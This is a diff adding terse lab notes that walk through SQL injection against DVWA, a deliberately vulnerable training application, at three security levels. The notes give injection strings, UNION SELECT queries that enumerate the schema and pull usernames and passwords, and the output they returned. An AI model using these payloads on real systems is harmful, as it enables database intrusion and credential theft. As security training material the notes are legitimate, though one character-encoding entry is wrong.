@@ -1,0 +1,99 @@
+##security level 1
+Enter: 1' OR 1 #
+# comment out last quote
+1' consume first quote
+##security level 2
+--SQL statemetn structure
+$id = mysql_real_escape_string($id)
+SELECT first_name, last_name FROM users WHERE user_id = $id;
+
+--Step 1
+ID: 1 OR 1
+First name: admin
+Surname: admin
+
+ID: 1 OR 1
+First name: Gordon
+Surname: Brown
+
+ID: 1 OR 1
+First name: Hack
+Surname: Me
+
+ID: 1 OR 1
+First name: Pablo
+Surname: Picasso
+
+ID: 1 OR 1
+First name: Bob
+Surname: Smith
+
+
+
+--STEP 2. SQL INJECTION CODE
+1 OR 1 UNION SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES
+
+--OUTPUT
+ID: 1 OR 1 UNION SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES
+First name: guestbook
+Surname: dvwa
+
+ID: 1 OR 1 UNION SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES
+First name: users
+Surname: dvwa
+
+--Step 3.
+1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+--output
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: guestbook
+Surname: comment_id
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: guestbook
+Surname: comment
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: guestbook
+Surname: name
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: users
+Surname: user_id
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: users
+Surname: first_name
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: users
+Surname: last_name
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: users
+Surname: user
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: users
+Surname: password
+
+ID: 1 OR 1 UNION SELECT table_name, column_name FROM information_schema.columns
+First name: users
+Surname: avatar
+
+--Step. 4
+1 OR 1 UNION SELECT user, password FROM users
+
+
+##security level 3
+Mysql_real_escape_string() excapes the following:  \x00, \n, \r, \, ', " and \x1a.
+
+$id = stripslashes($id);
+$id = mysql_real_escape_string($id); 
+IF is_numeric($id)
+"SELECT first_name, last_name FROM users WHERE user_id = '$id'"; 
+' html=&#39 hex=27 oct=47
+= html=&#61 hex=3d
+\ html=&#95 hex=5c
+1 OR 1 -- 
